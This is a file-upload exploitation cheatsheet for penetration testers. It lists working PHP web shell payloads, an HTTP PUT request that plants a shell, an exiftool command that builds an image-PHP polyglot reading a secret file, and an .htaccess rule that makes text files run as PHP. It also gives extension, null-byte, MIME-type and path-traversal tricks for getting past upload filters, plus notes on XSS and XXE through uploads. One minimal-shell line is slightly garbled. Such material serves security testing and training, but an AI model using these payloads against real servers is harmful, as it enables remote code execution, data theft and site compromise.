# 🧠 File Upload Exploitation - Advanced Cheatsheet

https://github.com/six2dez/pentest-book/blob/master/enumeration/web/upload-bypasses.md

## General
- 🔁 **Overwrite files**: Overwrite existing files if filename or path is not properly handled.
- 🐘 **DoS via File Size / Brute Force**: Upload large files or repeatedly upload to exhaust server resources.

## 🔍 Server-side Behavior
- `Content-Type`: Can be forged to bypass restrictions.
- `Content-Disposition`: Controls the uploaded file’s name.
- MIME Types: Weak validation can be bypassed (`image/png` with PHP payload).

---

## 🐚 Web Shell Uploads

### 01 - RCE via Direct Web Shell
- Upload `.php` file with payload like `<?php system($_REQUEST["cmd"]); ?>`
- Access via public URL: `/files/avatars/webshell.php?cmd=id`

### 02 - Bypass via `Content-Type`
- Set `Content-Type: image/png`
- Embed PHP code inside the image — server may still execute it.
```t
## 🖼️ Common Image Types (often whitelisted)
image/jpeg
image/png
image/gif
image/bmp
image/webp
image/svg+xml ← 🔥 useful for XSS payloads in SVG

## 📄 Document Types (used for XXE, metadata injection, etc.)
application/pdf
application/msword
application/vnd.ms-excel
application/vnd.openxmlformats-officedocument.wordprocessingml.document (.docx)
application/vnd.openxmlformats-officedocument.spreadsheetml.sheet (.xlsx)
text/plain ← often accepted, can hide PHP
text/html ← for stored XSS if rendered

## 🧙 Script / Dangerous Types (might be blocked but useful if accepted)
application/x-php
application/x-httpd-php
application/x-perl
application/x-python
application/javascript
text/javascript
text/x-shellscript
text/x-php ← used in some environments

## 🛠️ Polyglot / Edge Case Types
application/octet-stream ← generic binary, may bypass checks
multipart/form-data ← standard for file uploads
application/x-www-form-urlencoded ← sometimes misused

## 🧼 Obfuscation / Evasion Tricks
image/png (used with PHP code inside)
image/jpeg (same trick)
text/plain with PHP code
application/json (some servers parse it insecurely)
application/xml (XXE)
```


### 03 - Path Traversal
- Upload using `filename="../webshell.php"`
- Bypasses restricted folders and places file in an executable path.

### 04 - Obfuscated Extension
- Use tricks like: `ws.php%00.jpg`, `shell.php.jpg`, `.php;.jpg`
- Null byte (`%00`) truncates extension in some servers.

### 05 - Polyglot Web Shell
- Use **magic bytes** and **malicious metadata** (`exiftool`, `cat`)
- Files appear as images but execute code.
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hat_only.png -o polyglot.php
```

### 06 - PUT method
```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php system($_REQUEST["cmd"]); ?>
```



---



## 🧱 Protections & Bypasses

### 🧨 Extension Blacklist Bypass
```md
.php, .php3, .php5, .phtml, .phps, .asp, .aspx, .jsp, .cgi
.php.jpg, .php.png, .php.txt
exploit.php%00.jpg, exploit.asp;.jpg
exploit.p.phphp, .shell.php.jpg
🔐 .htaccess Trick
Upload .htaccess to force server to treat .txt, .html as PHP:


AddType application/x-httpd-php .html .htm .txt
📎 Other Non-RCE Vectors
Stored XSS via File Upload
Upload .html or .svg with <script> tag.

If the file is accessible under the same origin, stored XSS is possible.

XXE via File Parsing
Servers processing XML (e.g. .doc, .xls, .odt) may be vulnerable to XXE attacks.

🧪 Tips & Reminders
🧪 Fuzz file paths post-upload to locate the shell.

🕵️‍♂️ Check server responses (Location, Content-Disposition).

🐚 Minimal shell: <?=\$_GET[0]`; ?>accessed via/?0=id`

📌 Quick Methodology
Try direct .php upload for RCE.

Bypass MIME with forged image/png.

Use path traversal to escape restricted dirs.

Evade with double extension or null byte.

Create polyglot with crafted metadata.

Upload .htaccess to enable unexpected extensions.

If RCE fails, go for XSS or XXE.